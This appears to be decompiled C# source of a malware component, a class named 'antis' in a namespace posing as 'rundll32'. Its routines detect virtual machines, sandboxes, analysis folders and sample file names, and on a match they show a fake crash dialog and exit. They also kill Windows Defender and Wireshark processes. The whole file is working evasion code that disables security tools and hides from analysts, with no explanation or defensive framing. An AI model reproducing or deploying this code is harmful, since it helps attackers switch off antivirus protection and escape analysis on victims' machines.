using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;

namespace rundll32;

internal class antis
{
	public static void Check()
	{
		if (AVPC())
		{
			iSdbg();
		}
		else if (AA1())
		{
			iSdbg();
		}
		else if (AA12())
		{
			iSdbg();
		}
		else if (AS())
		{
			iSdbg();
		}
		else if (AVB())
		{
			iSdbg();
		}
		else if (ASB())
		{
			iSdbg();
		}
		else if (ATE())
		{
			iSdbg();
		}
		AntiWinDef1();
		AntiWinDef2();
		AntiWireShark();
	}

	private static void iSdbg()
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("Application Error: The instruction at \"0x7883b4\" referenced memory at \"0x004467\". The memory could not be \"read\".", "Critical Error!", (MessageBoxButtons)0, (MessageBoxIcon)16);
		Environment.Exit(0);
	}

	private static bool AVB()
	{
		if (prcIsRunning("VBoxService"))
		{
			return true;
		}
		return false;
	}

	private static bool ASB()
	{
		if (Directory.Exists("C:\\analysis"))
		{
			return true;
		}
		return false;
	}

	private static void AntiWireShark()
	{
		if (prcIsRunning("wireshark"))
		{
			killProcess("wireshark");
		}
	}

	private static void AntiWinDef1()
	{
		if (prcIsRunning("MSASCui"))
		{
			killProcess("MSASCui");
		}
	}

	private static void AntiWinDef2()
	{
		if (prcIsRunning("msmpeng"))
		{
			killProcess("msmpeng");
		}
	}

	private static bool AS()
	{
		if ((Process.GetProcessesByName("SbieSvc").Length >= 1) | (Process.GetProcessesByName("sniff_hit").Length >= 1) | (Process.GetProcessesByName("sysAnalyzer").Length >= 1))
		{
			return true;
		}
		return false;
	}

	private static bool AA1()
	{
		string startupPath = Application.get_StartupPath();
		string text = startupPath + "\\sample.exe";
		if (Application.get_ExecutablePath() == text)
		{
			return true;
		}
		return false;
	}

	private static bool ATE()
	{
		if (Process.GetCurrentProcess().MainModule!.FileName!.Contains("sample"))
		{
			return true;
		}
		return false;
	}

	private static bool AA12()
	{
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", writable: false);
		object value = registryKey.GetValue("ProductId");
		string text = "76487-337-8429955-22614";
		if ((string)value == text)
		{
			return true;
		}
		return false;
	}

	private static bool AVPC()
	{
		if ((Process.GetProcessesByName("vpcmap").Length >= 4) & (Process.GetProcessesByName("vmsrvc").Length >= 4))
		{
			return true;
		}
		if (Process.GetProcessesByName("vmusrvc").Length >= 4)
		{
			return true;
		}
		return false;
	}

	private static bool prcIsRunning(string process)
	{
		Process[] processes = Process.GetProcesses();
		int num = 0;
		while (true)
		{
			if (num < processes.Length)
			{
				Process process2 = processes[num];
				if (process2.ProcessName.Contains(process))
				{
					break;
				}
				num++;
				continue;
			}
			return false;
		}
		return true;
	}

	private static void killProcess(string process)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process2 in processes)
		{
			if (process2.ProcessName.Contains(process))
			{
				try
				{
					process2.Kill();
				}
				catch
				{
				}
			}
		}
	}
}
